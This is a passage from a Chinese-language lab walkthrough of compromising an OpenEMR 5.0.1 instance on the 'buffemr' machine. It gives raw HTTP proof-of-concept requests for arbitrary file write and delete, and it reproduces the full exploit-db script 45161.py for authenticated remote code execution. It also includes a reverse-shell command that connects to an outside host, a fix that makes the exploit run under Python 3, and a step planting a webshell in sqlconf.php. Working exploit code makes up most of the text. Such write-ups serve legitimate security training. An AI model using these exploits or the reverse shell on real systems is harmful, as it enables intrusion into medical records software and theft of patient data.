class="line"><span class="language-apache"><span class="attribute">Connection</span>: close</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">54</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">mode</span>=save&amp;docid=payload.php&amp;content=&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment"># After sending this navigate to payload.php at http://hostname/openemr/portal</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment"># 3. Arbitrary File Delete:</span></span></span><br><span class="line"><span class="language-apache"><span class="comment"># In OpenEmr a user that has access to the portal can send a malcious</span></span></span><br><span class="line"><span class="language-apache"><span class="comment"># POST request to delete a arbitrary file.</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment">#  i. Vulnerable Code:</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#     &#125; else if ($_POST[&#x27;mode&#x27;] == &#x27;delete&#x27;) &#123;</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#       unlink($_POST[&#x27;docid&#x27;]);</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#       exit(true);</span></span></span><br><span class="line"><span class="language-apache"><span class="comment">#     &#125;</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment">#  ii. Proof of Concept:</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /openemr/portal/import_template.php HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (X11; Linux x86_64; rv:<span class="number">52</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Language: en-US,en;q=<span class="number">0</span>.<span class="number">5</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cookie</span>: OpenEMR=k3m0vq90hhb5et06rib5l7l8fq; PHPSESSID=<span class="number">1</span>dbh9mom6ib07jqovfusgjc3vs</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: close</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">29</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">mode</span>=delete&amp;docid=payload.php</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="comment"># After completing this request, when you navigate to payload.php, you should be greeted by a 404 page.   </span></span></span><br></pre></td></tr></table></figure>
<p>具体操作亦可参见：<a
target="_blank" rel="noopener" href="https://bantttian.github.io/2020/02/12/CVE-2018-1514X-OpenEMR-5-0-1-%E4%B8%89%E5%A4%84%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">CVE-2018-1514X
OpenEMR 5.0.1 三处漏洞复现分析 | Bantian</a></p>
<p>文件读取示例：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221056931.jpg" /></p>
<p>文件读取没找到进一步利用的方法</p>
<p>进一步测试其余漏洞发现
/usr/share/exploitdb/exploits/php/webapps/45161.py 可成功反弹 shell</p>
<p>45161.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)</span></span><br><span class="line"><span class="comment"># Author: Cody Zacharias</span></span><br><span class="line"><span class="comment"># Date: 2018-08-07</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.open-emr.org/</span></span><br><span class="line"><span class="comment"># Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz</span></span><br><span class="line"><span class="comment"># Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile</span></span><br><span class="line"><span class="comment"># Version: &lt; 5.0.1 (Patch 4)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3</span></span><br><span class="line"><span class="comment"># References:</span></span><br><span class="line"><span class="comment"># https://www.youtube.com/watch?v=DJSQ8Pk_7hc</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">WARNING: This proof-of-concept exploit WILL replace the GLOBAL config.</span></span><br><span class="line"><span class="string">If you don&#x27;t want the OpenEMR config to be reset to default, please modify</span></span><br><span class="line"><span class="string">the payload.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example Usage:</span></span><br><span class="line"><span class="string">- python openemr_rce.py http://127.0.0.1/openemr-5_0_1_3 -u admin -p admin -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ap = argparse.ArgumentParser(description=<span class="string">&quot;OpenEMR RCE&quot;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&quot;host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to OpenEMR (Example: http://127.0.0.1/openemr).&quot;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Admin username&quot;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Admin password&quot;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Command to run.&quot;</span>)</span><br><span class="line">args = ap.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="built_in">ascii</span> = <span class="string">&quot;&gt; .---.  ,---.  ,---.  .-. .-.,---.          ,---.    &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt;/ .-. ) | .-.\ | .-&#x27;  |  \| || .-&#x27;  |\    /|| .-.\   &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt;| | |(_)| |-&#x27; )| `-.  |   | || `-.  |(\  / || `-&#x27;/   &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt;| | | | | |--&#x27; | .-&#x27;  | |\  || .-&#x27;  (_)\/  ||   (    &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt;\ `-&#x27; / | |    |  `--.| | |)||  `--.| \  / || |\ \   &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt; )---&#x27;  /(     /( __.&#x27;/(  (_)/( __.&#x27;| |\/| ||_| \)\  &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;&gt;(_)    (__)   (__)   (__)   (__)    &#x27;-&#x27;  &#x27;-&#x27;    (__) &lt;\r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;                                                       \r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;   =&#123;&gt;   P R O J E C T    I N S E C U R I T Y   &lt;&#125;=    \r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;                                                       \r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;         Twitter : &gt;@Insecurity&lt;                       \r\n&quot;</span></span><br><span class="line"><span class="built_in">ascii</span>+= <span class="string">&quot;         Site    : &gt;insecurity.sh&lt;                     \r\n&quot;</span></span><br><span class="line"></span><br><span class="line">green = <span class="string">&quot;\033[1;32m&quot;</span></span><br><span class="line">red = <span class="string">&quot;\033[1;31m&quot;</span></span><br><span class="line">clear = <span class="string">&quot;\033[0m&quot;</span></span><br><span class="line"></span><br><span class="line">load = <span class="string">&quot;[&gt;$&lt;] &quot;</span>.replace(<span class="string">&quot;&gt;&quot;</span>, green).replace(<span class="string">&quot;&lt;&quot;</span>, clear)</span><br><span class="line">err = <span class="string">&quot;[&gt;-&lt;] &quot;</span>.replace(<span class="string">&quot;&gt;&quot;</span>, red).replace(<span class="string">&quot;&lt;&quot;</span>, clear)</span><br><span class="line">intro = <span class="built_in">ascii</span>.replace(<span class="string">&quot;&gt;&quot;</span>, green).replace(<span class="string">&quot;&lt;&quot;</span>, clear)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(intro)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> s:</span><br><span class="line">    login = &#123;<span class="string">&quot;new_login_session_management&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;authProvider&quot;</span>: <span class="string">&quot;Default&quot;</span>,</span><br><span class="line">            <span class="string">&quot;authUser&quot;</span>: args.user,</span><br><span class="line">            <span class="string">&quot;clearPass&quot;</span>: args.password,</span><br><span class="line">            <span class="string">&quot;languageChoice&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(load + <span class="string">&quot;Authenticating with &quot;</span> + args.user + <span class="string">&quot;:&quot;</span> + args.password)</span><br><span class="line">    r = s.post(args.host + <span class="string">&quot;/interface/main/main_screen.php?auth=login&amp;site=default&quot;</span>, data=login)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;login_screen.php?error=1&amp;site=&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(err + <span class="string">&quot;Failed to Login.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This will rewrite and replace your current GLOBALS, please modify this if you don&#x27;t want that.</span></span><br><span class="line">    payload = <span class="string">&quot;form_save=Save&amp;srch_desc=&amp;form_0=main_info.php&amp;form_1=..%2F..%2Finterface&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%2Fmain%2Fmessages%2Fmessages.php%3Fform_active%3D1&amp;form_2=1&amp;form_3=tabs_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;style_full.css&amp;form_4=style_light.css&amp;form_5=__default__&amp;form_6=__default&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;__&amp;form_7=1&amp;form_8=0&amp;form_9=175&amp;form_10=OpenEMR&amp;form_12=1&amp;form_13=0&amp;form_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;14=0&amp;form_16=1&amp;form_21=1&amp;form_22=1&amp;form_23=1&amp;form_24=1&amp;form_25=http%3A%2F&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%2Fopen-emr.org%2F&amp;form_26=&amp;form_27=20&amp;form_28=10&amp;form_30=0&amp;form_31=5&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_32=0&amp;form_37=English+%28Standard%29&amp;form_38=1&amp;form_42=1&amp;form_43=1&amp;form_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;44=1&amp;form_45=1&amp;form_46=1&amp;form_47=1&amp;form_48=1&amp;form_49=1&amp;form_50=1&amp;form_51=&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;0&amp;form_52=0&amp;form_53=&amp;form_54=2&amp;form_55=.&amp;form_56=%2C&amp;form_57=%24&amp;form_58=&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;0&amp;form_59=3&amp;form_60=6%2C0&amp;form_61=0&amp;form_62=0&amp;form_63=_blank&amp;form_69=1&amp;fo&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;rm_70=1&amp;form_77=1&amp;form_79=&amp;form_80=&amp;form_81=&amp;form_84=1&amp;form_85=1&amp;form_87=&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;1&amp;form_89=1&amp;form_90=1&amp;form_91=1&amp;form_92=Y1&amp;form_93=1&amp;form_94=2&amp;form_95=0&amp;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;form_97=14&amp;form_98=11&amp;form_99=24&amp;form_100=20&amp;form_102=1&amp;form_103=0&amp;form_1&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;04=0&amp;form_105=ICD10&amp;form_106=1&amp;form_107=1&amp;form_112=3&amp;form_115=1&amp;form_116=&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;&amp;form_119=1.00&amp;form_121=0&amp;form_123=&amp;form_125=30&amp;form_126=&amp;form_127=60&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_128=&amp;form_129=90&amp;form_130=&amp;form_131=120&amp;form_132=&amp;form_133=150&amp;form_134&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;=&amp;form_135=1&amp;form_138=1&amp;form_139=1&amp;form_141=1&amp;form_142=0&amp;form_143=localho&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;st&amp;form_144=&amp;form_145=&amp;form_146=5984&amp;form_147=&amp;form_150=Patient+ID+card&amp;f&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;orm_151=Patient+Photograph&amp;form_152=Lab+Report&amp;form_153=Lab+Report&amp;form_1&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;55=100&amp;form_157=8&amp;form_158=17&amp;form_159=15&amp;form_160=day&amp;form_161=1&amp;form_16&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;2=2&amp;form_163=1&amp;form_164=10&amp;form_165=10&amp;form_166=15&amp;form_167=20&amp;form_168=1&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;&amp;form_169=%23FFFFFF&amp;form_170=%23E6E6FF&amp;form_171=%23E6FFE6&amp;form_172=%23FFE&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;6FF&amp;form_173=1&amp;form_174=0&amp;form_176=1&amp;form_177=1&amp;form_178=1&amp;form_181=1&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_182=1&amp;form_183=1&amp;form_184=1&amp;form_185=D0&amp;form_186=D0&amp;form_187=0%3A20&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_188=0&amp;form_190=33&amp;form_191=0&amp;form_194=7200&amp;form_198=1&amp;form_199=0&amp;form_2&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;00=0&amp;form_202=&amp;form_203=&amp;form_204=365&amp;form_205=&amp;form_206=1&amp;form_208=&amp;form&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;_210=&amp;form_211=&amp;form_212=&amp;form_213=&amp;form_214=&amp;form_215=&amp;form_216=SMTP&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_217=localhost&amp;form_218=25&amp;form_219=&amp;form_220=&amp;form_221=&amp;form_222=50&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_223=50&amp;form_224=&amp;form_225=&amp;form_226=&amp;form_227=50&amp;form_228=&amp;form_229=&amp;fo&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;rm_230=&amp;form_231=1&amp;form_232=1&amp;form_233=1&amp;form_234=1&amp;form_235=1&amp;form_236=1&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;&amp;form_237=1&amp;form_238=1&amp;form_239=Model+Registry&amp;form_240=125789123&amp;form_24&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;1=1&amp;form_242=1&amp;form_243=1&amp;form_244=&amp;form_245=&amp;form_246=1&amp;form_247=1&amp;form_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;248=1&amp;form_249=5&amp;form_250=1&amp;form_252=1&amp;form_253=1&amp;form_254=1&amp;form_255=1&amp;f&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;orm_256=1&amp;form_257=1&amp;form_258=1&amp;form_262=&amp;form_263=6514&amp;form_264=&amp;form_26&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;5=&amp;form_267=1&amp;form_268=0&amp;form_269=%2Fusr%2Fbin&amp;form_270=%2Fusr%2Fbin&amp;form&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;_271=%2Ftmp&amp;form_272=%2Ftmp&amp;form_273=26&amp;form_274=state&amp;form_275=1&amp;form_27&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;6=26&amp;form_277=country&amp;form_278=lpr+-P+HPLaserjet6P+-o+cpi%3D10+-o+lpi%3D6&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;+-o+page-left%3D72+-o+page-top%3D72&amp;form_279=&amp;form_280=&amp;form_282=2018-07-&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;23&amp;form_283=1&amp;form_285=%2Fvar%2Fspool%2Fhylafax&amp;form_286=enscript+-M+Lett&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;er+-B+-e%5E+--margins%3D36%3A36%3A36%3A36&amp;form_288=%2Fmnt%2Fscan_docs&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_290=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fportal&amp;form_292=1&amp;form_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;296=https%3A%2F%2Fyour_web_site.com%2Fopenemr%2Fpatients&amp;form_297=1&amp;form_&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;299=&amp;form_300=&amp;form_301=&amp;form_302=https%3A%2F%2Fssh.mydocsportal.com%2Fpr&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;ovider.php&amp;form_303=https%3A%2F%2Fssh.mydocsportal.com&amp;form_305=https%3A%&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;2F%2Fyour_cms_site.com%2F&amp;form_306=&amp;form_307=&amp;form_308=0&amp;form_309=https%3&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;A%2F%2Fhapi.fhir.org%2FbaseDstu3%2F&amp;form_312=https%3A%2F%2Fsecure.newcrop&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;accounts.com%2FInterfaceV7%2FRxEntry.aspx&amp;form_313=https%3A%2F%2Fsecure.n&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;ewcropaccounts.com%2Fv7%2FWebServices%2FUpdate1.asmx%3FWSDL%3Bhttps%3A%2F&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%2Fsecure.newcropaccounts.com%2Fv7%2FWebServices%2FPatient.asmx%3FWSDL&amp;fo&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;rm_314=21600&amp;form_315=21600&amp;form_316=&amp;form_317=&amp;form_318=&amp;form_319=1&amp;form&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;_324=&amp;form_325=0&amp;form_327=137&amp;form_328=7C84773D5063B20BC9E41636A091C6F17E&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;9C1E34&amp;form_329=C36275&amp;form_330=0&amp;form_332=https%3A%2F%2Fphimail.example.&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;com%3A32541&amp;form_333=&amp;form_334=&amp;form_335=admin&amp;form_336=5&amp;form_339=1&amp;form&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;_346=LETTER&amp;form_347=30&amp;form_348=30&amp;form_349=72&amp;form_350=30&amp;form_351=P&amp;fo&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;rm_352=en&amp;form_353=LETTER&amp;form_354=5&amp;form_355=5&amp;form_356=5&amp;form_357=8&amp;for&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;m_358=D&amp;form_359=1&amp;form_360=9&amp;form_361=1&amp;form_362=104.775&amp;form_363=241.3&amp;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;form_364=14&amp;form_365=65&amp;form_366=220&quot;</span></span><br><span class="line"></span><br><span class="line">    p = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;\n&quot;</span>).splitlines():</span><br><span class="line">        a = c.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        p.update(&#123;a[<span class="number">0</span>]: a[<span class="number">1</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Linux only, but can be easily modified for Windows.</span></span><br><span class="line">    _cmd = <span class="string">&quot;|| echo &quot;</span> + base64.b64encode(args.cmd) + <span class="string">&quot;|base64 -d|bash&quot;</span></span><br><span class="line">    p.update(&#123;<span class="string">&quot;form_284&quot;</span>: _cmd&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(load + <span class="string">&quot;Injecting payload&quot;</span>)</span><br><span class="line">    s.post(args.host + <span class="string">&quot;/interface/super/edit_globals.php&quot;</span>, data=p)</span><br><span class="line">    sp = s.get(args.host + <span class="string">&quot;/interface/main/daemon_frame.php&quot;</span>) <span class="comment"># M4tt D4em0n w0z h3r3 ;PpPpp</span></span><br><span class="line">    <span class="keyword">if</span> sp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(load + <span class="string">&quot;Payload executed&quot;</span>) </span><br></pre></td></tr></table></figure>
<p>反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 45161.py http://192.168.1.155/openemr -u admin -p Monster123 -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.184/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221106538.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221106539.jpg" /></p>
<p>可能会遇到的报错信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/Desktop/45161.py&quot;</span>, line 136, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    _cmd = <span class="string">&quot;|| echo &quot;</span> + base64.b64encode(args.cmd) + <span class="string">&quot;|base64 -d|bash&quot;</span></span><br><span class="line">                        ^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.11/base64.py&quot;</span>, line 58, <span class="keyword">in</span> b64encode</span><br><span class="line">    encoded = binascii.b2a_base64(s, newline=False)</span><br><span class="line">              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">TypeError: a bytes-like object is required, not <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在 Python 3 中，需要先将字符串编码为字节，然后才能进行 base64
编码。修改代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_cmd = <span class="string">&quot;|| echo &quot;</span> + base64.b64encode(args.cmd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">&quot;|base64 -d|bash&quot;</span></span><br></pre></td></tr></table></figure>
<p>找到几个当前用户可写入的 php 文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@buffemr:/<span class="keyword">var</span>/www/html/openemr$ find . -writable <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">./sites/<span class="keyword">default</span>/era</span><br><span class="line">./sites/<span class="keyword">default</span>/documents</span><br><span class="line">./sites/<span class="keyword">default</span>/sqlconf.php</span><br><span class="line">./sites/<span class="keyword">default</span>/letter_templates</span><br><span class="line">./sites/<span class="keyword">default</span>/edi</span><br><span class="line">./gacl/admin/templates_c</span><br><span class="line">./<span class="class"><span class="keyword">interface</span>/<span class="title">modules</span>/<span class="title">zend_modules</span>/<span class="title">config</span>/<span class="title">application</span>.<span class="title">config</span>.<span class="title">php</span></span></span><br><span class="line"><span class="class">./<span class="title">interface</span>/<span class="title">main</span>/<span class="title">calendar</span>/<span class="title">modules</span>/<span class="title">PostCalendar</span>/<span class="title">pntemplates</span>/<span class="title">cache</span></span></span><br><span class="line"><span class="class">./<span class="title">interface</span>/<span class="title">main</span>/<span class="title">calendar</span>/<span class="title">modules</span>/<span class="title">PostCalendar</span>/<span class="title">pntemplates</span>/<span class="title">compiled</span></span></span><br></pre></td></tr></table></figure>
<p>往 sqlconf.php 中写个 webshell，以便利后续操作【上传下载文件】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221323541.jpg" /></p>
<p>蚁剑链接测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221325603.jpg" /></p>
<p>可正常使用！</p>
<h3 id="提权至-buffemr">2.2. 提权至 buffemr</h3>
